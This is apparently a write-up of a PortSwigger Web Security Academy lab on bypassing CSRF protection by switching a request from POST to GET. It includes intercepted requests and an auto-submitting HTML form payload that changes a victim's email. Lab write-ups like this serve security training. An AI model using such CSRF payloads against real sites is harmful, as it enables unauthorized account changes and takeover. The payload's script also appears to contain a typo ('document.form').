# Lab: CSRF where token validation depends on request method
# https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

```bash
# Login wiener:peter and upadate your email.(a@gmail.com)
# Check change-email.

email=a%40gmail.com&csrf=dU59nxMwlWSbyDZANtK6BRsBT0560A19

```

```bash
# Send request to the repeater and try to change csrf and send request.

email=a%40gmail.com&csrf=dU59nxMwlWSbyDZANtK6BRsBT0560A1A

# Response:
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Invalid CSRF token"

```
```bash
# So we can't use Post request let's try Get version. Send the request to repeater again from target.
# Right click to request and click to change request method.

GET /my-account/change-email?email=basca%40gmail.com

# Change the email value like i did, remove the csrf token part and send the request.

HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0

# But if you click on Follow redirection you will see:
HTTP/2 200 OK

# We successfuly changed our email.
# Request can be changed to GET and doesn't require csrf token.
```
```bash
<form action="https://0a4b002203f03b4880b5b7560037004a.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="virusa@gmail.com">
</form>
<script>
	document.form[0].submit();
</script>

# In HTML, if the method attribute is not specified in a <form> element, the default method used is GET. 
```
